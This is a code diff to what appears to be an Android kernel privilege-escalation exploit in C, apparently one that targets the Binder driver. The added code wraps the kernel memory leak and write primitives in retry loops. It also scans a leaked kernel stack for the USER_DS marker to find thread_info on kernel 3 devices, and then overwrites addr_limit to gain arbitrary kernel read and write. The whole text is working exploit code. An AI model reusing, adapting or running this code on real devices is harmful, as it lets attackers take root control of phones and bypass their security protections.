@@ -23,6 +23,7 @@
 #define OFFSET__cred__cap_effective (OFFSET__cred__cap_permitted+0x008)
 #define OFFSET__cred__cap_bset (OFFSET__cred__cap_permitted+0x010)
 
+#define USER_DS 0x8000000000ul
 #define BINDER_SET_MAX_THREADS 0x40046205ul
 #define MAX_THREADS 3
 
@@ -513,6 +514,31 @@ DONE:
     
     return success;
 }
+
+int leak_data_retry(void *leakBuffer, int leakAmount,
+               unsigned long extraLeakAddress, void *extraLeakBuffer, int extraLeakAmount,
+               unsigned long *task_struct_ptr_p, unsigned long *kstack_p) {
+    int try = 0;
+    while (try < RETRIES && !leak_data(leakBuffer, leakAmount, extraLeakAddress, extraLeakBuffer, extraLeakAmount, task_struct_ptr_p, kstack_p)) {
+        message("MAIN: **fail** retrying");
+        try++;
+    }
+    if (0 < try && try < RETRIES) 
+        message("MAIN: it took %d tries, but succeeded", try);
+    return try < RETRIES;        
+}
+
+int clobber_data_retry(unsigned long payloadAddress, const void *src, unsigned long payloadLength) {
+    int try = 0;
+    while (try < RETRIES && !clobber_data(payloadAddress, src, payloadLength)) {
+        message("MAIN: **fail** retrying");
+        try++;
+    }
+    if (0 < try && try < RETRIES) 
+        message("MAIN: it took %d tries, but succeeded", try);
+    return try < RETRIES;        
+}
+
 
 int kernel_rw_pipe[2];
 
@@ -1093,6 +1119,21 @@ DONE:
     return allowed;
 }
 
+/* for devices with randomized thread_info location on stack: thanks to chompie1337 */
+unsigned long find_thread_info_ptr_kernel3(unsigned long kstack) {
+    unsigned long kstack_data[16384/8];
+    
+    message("MAIN: parsing kernel stack to find thread_info");
+    if (!leak_data_retry(NULL, 0, kstack, kstack_data, sizeof(kstack_data), NULL, NULL)) 
+        error("Cannot leak kernel stack");
+    
+    for (unsigned int pos = 0; pos < sizeof(kstack_data)/8; pos++)
+        if (kstack_data[pos] == USER_DS)
+            return kstack+pos*8-8;
+        
+    return 0;
+}
+
 int main(int argc, char **argv)
 {
     int command = 0;
@@ -1164,36 +1205,32 @@ int main(int argc, char **argv)
 
     unsigned long kstack = 0xDEADBEEFDEADBEEFul;
     unsigned long task_struct_ptr = 0xDEADBEEFDEADBEEFul;
-    int try = 0;
-    while (try < RETRIES && !leak_data(NULL, 0, 0, NULL, 0, &task_struct_ptr, &kstack)) {
-        message("MAIN: **fail** retrying");
-        try++;
-    }
-    if (try == RETRIES) {
+
+    // TODO: kstack is invalid on kernel 4
+    if (!leak_data_retry(NULL, 0, 0, NULL, 0, &task_struct_ptr, &kstack)) {
         error("Failed to leak data");
     }
-    else if (try > 0) {
-        message("MAIN: took %d tries but did it", try);
-    }
+
+    unsigned long thread_info_ptr;
     
-    unsigned long thread_info_ptr = kernel3 ? kstack : task_struct_ptr;
+    if (kernel3) {
+        thread_info_ptr = find_thread_info_ptr_kernel3(kstack);
+        if (thread_info_ptr == 0)
+            error("Cannot find thread_info_ptr");
+    }
+    else {
+        thread_info_ptr = task_struct_ptr;
+    }
     
     message("MAIN: task_struct_ptr = %lx", (unsigned long)task_struct_ptr);
     if (kernel3) 
         message("MAIN: stack = %lx", kstack);
+    message("MAIN: thread_info_ptr = %lx", (unsigned long)thread_info_ptr);
     message("MAIN: Clobbering addr_limit");
     unsigned long const src = 0xFFFFFFFFFFFFFFFEul;
 
-    try = 0;
-    while(try < RETRIES && !clobber_data(thread_info_ptr + 8, &src, 8)) {
-        message("MAIN: **fail** retrying");
-        try++;
-    }
-    if (try == RETRIES) {
+    if (!clobber_data_retry(thread_info_ptr + 8, &src, 8)) {
         error("Failed to clobber addr_limit");
-    }
-    else if (try > 0) {
-        message("MAIN: took %d tries but did it", try);
     }
 
     message("MAIN: thread_info = 0x%lx", thread_info_ptr);
